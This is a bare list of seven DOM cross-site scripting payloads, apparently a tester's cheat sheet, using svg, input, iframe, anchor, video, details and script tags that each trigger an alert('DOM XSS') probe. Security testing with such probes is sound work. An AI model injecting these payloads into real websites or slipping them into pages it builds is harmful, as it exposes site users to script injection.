DOM XSS PAYLOADS

1. SVG:
<svg onload=alert('DOM XSS')></svg>

2. Input autofocus:
<input autofocus onfocus=alert('DOM XSS')>

3. iframe:
<iframe src="javascript:alert('DOM XSS')"></iframe>

4. Anchor:
<a href="javascript:alert('DOM XSS')">Click</a>

5. Video:
<video src=x onerror=alert('DOM XSS')></video>

6. Details:
<details open ontoggle=alert('DOM XSS')></details>

7. Script:
<script>alert('DOM XSS')</script>
